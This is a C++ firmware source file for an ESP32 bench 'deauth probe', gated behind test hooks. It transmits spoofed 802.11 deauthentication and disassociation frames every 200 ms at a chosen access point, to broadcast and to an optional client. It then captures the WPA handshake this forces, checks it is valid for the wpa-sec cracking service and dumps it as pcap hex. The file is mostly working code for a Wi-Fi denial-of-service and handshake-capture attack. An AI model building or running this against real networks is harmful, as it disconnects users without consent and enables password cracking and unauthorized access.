/**
 * @file deauth_probe.cpp
 * @brief Implementation of the slice-0028 bench deauth probe (ADR-0027). Device-only.
 *
 * Deterministic gate (Scenario J): transmit built deauth AND disassoc frames at the target on a
 * cadence and report that the radio accepted each for TX (txOk climbing, txFail=0) — proof the
 * raw-TX path and the SDK bypass are working, needing no other station. selfHeard (our own frames
 * observed back on the promiscuous seam) is reported too but is INFORMATIONAL only: some radios
 * (this ESP32-S3 included) do not loop their own TX back through promiscuous RX, so it is not part
 * of the gate. Opportunistic e2e (Scenario K): a HandshakeCollector aimed at the AP captures the
 * handshake the deauth forces; on the first wpa-sec-valid capture the probe quiesces the sniffer
 * (so the driver task cannot be mid-ingest while we serialize), then emits the pcap hex-framed for
 * the verify to save. The shipped hunt loop never does any of this (ADR-0027 #4).
 */
#include "deauth_probe.h"

#if defined(SAPPER_TEST_HOOKS)

#include <Arduino.h>

#include <cstdio>
#include <cstdlib>
#include <cstring>

#include "net/deauth.h"
#include "net/handshake_collector.h"
#include "net/pcap.h"
#include "net/radio_sniffer.h"
#include "net/radio_sniffer_esp32.h"
#include "net/raw_transmitter_esp32.h"

namespace sapper {
namespace {

constexpr uint32_t kTxIntervalMs = 200;         // one deauth+disassoc burst per target every 200 ms.
constexpr uint32_t kHeartbeatIntervalMs = 2000;  // status line cadence for the verify artifact.
constexpr uint32_t kQuiesceSettleMs = 30;        // after sniffer.stop(), before serializing: lets any
                                                 // in-flight RX callback drain (ADR-0011 can't hard-join).

// A raw 802.11 deauth/disassoc is 26 bytes with FC subtype in byte 0, source in Addr2 (10-15) and
// BSSID in Addr3 (16-21) — see net/deauth.h. Named here so the self-heard check reads as intent.
constexpr size_t kFcSubtypeOffset = 0;
constexpr size_t kAddr2Offset = 10;
constexpr size_t kAddr3Offset = 16;

/// Fans each sniffed frame into the capture collector (for the forced-handshake e2e) and, in
/// parallel, counts our own deauth/disassoc frames heard back (the deterministic self-heard proof).
/// Runs in the Wi-Fi driver task, so it only forwards + counts — no allocation, no blocking
/// (§4 invariant #10).
class DeauthProbeConsumer : public FrameConsumer {
public:
    DeauthProbeConsumer(HandshakeCollector& collector, const uint8_t bssid[6])
        : collector_(collector) {
        std::memcpy(bssid_, bssid, sizeof(bssid_));
    }

    void onFrame(const uint8_t* frame, uint16_t len) override {
        collector_.ingest(frame, len);
        if (isOwnDeauth(frame, len)) ++selfHeard_;
    }

    uint32_t selfHeard() const { return selfHeard_; }

private:
    // A well-formed deauth/disassoc we sent: right length, a deauth/disassoc subtype, and both the
    // source and BSSID fields carrying our spoofed AP address.
    bool isOwnDeauth(const uint8_t* frame, uint16_t len) const {
        if (len < kDeauthFrameLen) return false;
        const uint8_t subtype = frame[kFcSubtypeOffset];
        if (subtype != static_cast<uint8_t>(ManagementSubtype::Deauth) &&
            subtype != static_cast<uint8_t>(ManagementSubtype::Disassoc)) {
            return false;
        }
        return std::memcmp(&frame[kAddr2Offset], bssid_, 6) == 0 &&
               std::memcmp(&frame[kAddr3Offset], bssid_, 6) == 0;
    }

    HandshakeCollector& collector_;
    uint8_t bssid_[6] = {0};
    volatile uint32_t selfHeard_ = 0;  // written in the driver task, read on the app task.
};

/// A CaptureSink over a fixed buffer, so the probe can serialize the forced handshake to pcap bytes
/// in RAM and then stream them (ADR-0009's sink seam; no filesystem on the bench).
class BufferSink : public CaptureSink {
public:
    bool write(const uint8_t* data, size_t len) override {
        if (used_ + len > sizeof(buf_)) return false;  // fail loud, never a truncated pcap.
        std::memcpy(buf_ + used_, data, len);
        used_ += len;
        return true;
    }
    const uint8_t* data() const { return buf_; }
    size_t size() const { return used_; }

private:
    uint8_t buf_[kMaxSerializedPcapLen];
    size_t used_ = 0;
};

bool g_active = false;
bool g_captured = false;  // set once the forced handshake is serialized; halts further TX + capture.
uint32_t g_txOk = 0;
uint32_t g_txFail = 0;
uint32_t g_lastTxMs = 0;
uint32_t g_lastHeartbeatMs = 0;
uint8_t g_bssid[6] = {0};
uint8_t g_client[6] = {0};
bool g_haveClient = false;

Esp32RadioSniffer* g_sniffer = nullptr;
Esp32RawTransmitter* g_tx = nullptr;
DeauthProbeConsumer* g_consumer = nullptr;
HandshakeCollector* g_collector = nullptr;

/// Parse "aa:bb:cc:dd:ee:ff" (case-insensitive) into six octets; false on any malformed field.
/// (Duplicated from rf_sniff_probe — the second instance; not hoisted per the rule of three, LEDGER.)
bool parseBssid(const char* text, uint8_t out[6]) {
    unsigned v[6];
    int consumed = 0;
    if (std::sscanf(text, "%x:%x:%x:%x:%x:%x%n", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5],
                    &consumed) != 6) {
        return false;
    }
    if (text[consumed] != '\0') return false;
    for (int i = 0; i < 6; ++i) {
        if (v[i] > 0xFF) return false;
        out[i] = static_cast<uint8_t>(v[i]);
    }
    return true;
}

/// Build @p subtype at the chosen destination and transmit it, tallying the outcome.
void transmitOne(ManagementSubtype subtype, const uint8_t dest[6]) {
    uint8_t frame[kDeauthFrameLen];
    const size_t n = buildDeauthFrame(frame, sizeof(frame), subtype, dest, g_bssid,
                                      DeauthReason::Class3FrameFromNonassoc);
    if (g_tx->transmit(frame, static_cast<uint16_t>(n))) {
        ++g_txOk;
    } else {
        ++g_txFail;
    }
}

/// Emit the captured pcap as hex between markers the verify reconstructs into a .pcap artifact.
void dumpPcap() {
    BufferSink sink;
    if (!serializeHandshake(g_collector->handshake(), sink)) {
        Serial.println("[DEAUTH] pcap serialize failed");  // not [ERROR]: no captured bytes to emit.
        return;
    }
    Serial.printf("[DEAUTH-PCAP-BEGIN] bytes=%u\n", static_cast<unsigned>(sink.size()));
    const uint8_t* p = sink.data();
    for (size_t i = 0; i < sink.size(); ++i) Serial.printf("%02X", p[i]);
    Serial.println();
    Serial.println("[DEAUTH-PCAP-END]");
}

}  // namespace

bool deauthProbeBegin() {
    const char* bssidText = SAPPER_TEST_DEAUTH_BSSID;
    if (bssidText == nullptr || bssidText[0] == '\0') return false;  // inactive: normal boot runs.

    if (!parseBssid(bssidText, g_bssid)) {
        Serial.printf("[FATAL] SAPPER_TEST_DEAUTH_BSSID malformed: %s\n", bssidText);
        return false;
    }
    char* end = nullptr;
    const long channel = std::strtol(SAPPER_TEST_DEAUTH_CHANNEL, &end, 10);
    if (end == SAPPER_TEST_DEAUTH_CHANNEL || *end != '\0' || channel < 1 || channel > 14) {
        Serial.printf("[FATAL] SAPPER_TEST_DEAUTH_CHANNEL not an integer in 1-14: '%s'\n",
                      SAPPER_TEST_DEAUTH_CHANNEL);
        return false;
    }

    // An optional specific client to target; absent -> broadcast (every client at once, no scanner).
    const char* clientText = SAPPER_TEST_DEAUTH_CLIENT;
    if (clientText != nullptr && clientText[0] != '\0') {
        if (!parseBssid(clientText, g_client)) {
            Serial.printf("[FATAL] SAPPER_TEST_DEAUTH_CLIENT malformed: %s\n", clientText);
            return false;
        }
        g_haveClient = true;
    }

    // File-scope lifetime: the RX callback forwards into the consumer for the probe's whole run.
    static HandshakeCollector collector(g_bssid, static_cast<uint8_t>(channel));
    static DeauthProbeConsumer consumer(collector, g_bssid);
    static Esp32RadioSniffer sniffer;
    static Esp32RawTransmitter transmitter;
    g_collector = &collector;
    g_consumer = &consumer;
    g_sniffer = &sniffer;
    g_tx = &transmitter;

    // Sniffer first: it brings the STA interface up promiscuous on the target channel, which the raw
    // transmitter then transmits on.
    if (!sniffer.begin(static_cast<uint8_t>(channel), consumer)) {
        Serial.println("[FATAL] promiscuous begin failed");
        return false;
    }

    g_active = true;
    // No bypass self-check: it could only call our own override (which always succeeds), proving
    // nothing about whether esp_wifi_80211_tx is wired to it. An ineffective bypass instead shows up
    // as txFail climbing while txOk stays 0 — which the verify gates on.
    Serial.printf("[DEAUTH] target bssid=%s channel=%ld dest=%s\n", bssidText, channel,
                  g_haveClient ? SAPPER_TEST_DEAUTH_CLIENT : "broadcast");
    return true;
}

bool deauthProbeActive() { return g_active; }

void deauthProbePump() {
    if (!g_active) return;

    const uint32_t now = millis();

    // Opportunistic e2e: the deauth forced a real handshake we captured. Quiesce the sniffer BEFORE
    // serializing — detach the consumer so the driver task cannot be mid-ingest into the collector
    // while we read it, then settle for any in-flight callback (ADR-0011 stop() cannot hard-join).
    // A torn frame in the pcap would be a silently corrupt capture, which pcap.h's contract and
    // quality-bar §3 forbid. Emit once, then stop transmitting: the radio is no longer promiscuous
    // and the capture goal is met.
    if (!g_captured && g_collector->isWpaSecValid()) {
        g_captured = true;
        g_sniffer->stop();
        delay(kQuiesceSettleMs);
        Serial.printf("[DEAUTH] forced handshake captured bssid=%s ssid=%s wpa-sec-valid=1\n",
                      SAPPER_TEST_DEAUTH_BSSID, g_collector->handshake().ssid);
        dumpPcap();
    }

    if (!g_captured && now - g_lastTxMs >= kTxIntervalMs) {
        g_lastTxMs = now;
        // Broadcast reaches clients we do not know about; a supplied client MAC is also targeted.
        transmitOne(ManagementSubtype::Deauth, kBroadcastMac);
        transmitOne(ManagementSubtype::Disassoc, kBroadcastMac);
        if (g_haveClient) {
            transmitOne(ManagementSubtype::Deauth, g_client);
            transmitOne(ManagementSubtype::Disassoc, g_client);
        }
    }

    if (now - g_lastHeartbeatMs >= kHeartbeatIntervalMs) {
        g_lastHeartbeatMs = now;
        Serial.printf("[DEAUTH] txOk=%lu txFail=%lu selfHeard=%lu captured=%d elapsed=%lums\n",
                      static_cast<unsigned long>(g_txOk), static_cast<unsigned long>(g_txFail),
                      static_cast<unsigned long>(g_consumer->selfHeard()), g_captured ? 1 : 0,
                      static_cast<unsigned long>(now));
    }
}

}  // namespace sapper

#else  // no SAPPER_TEST_HOOKS: no shipped binary carries the deauth probe or raw-TX (ADR-0027 #3).

namespace sapper {
bool deauthProbeBegin() { return false; }
bool deauthProbeActive() { return false; }
void deauthProbePump() {}
}  // namespace sapper

#endif
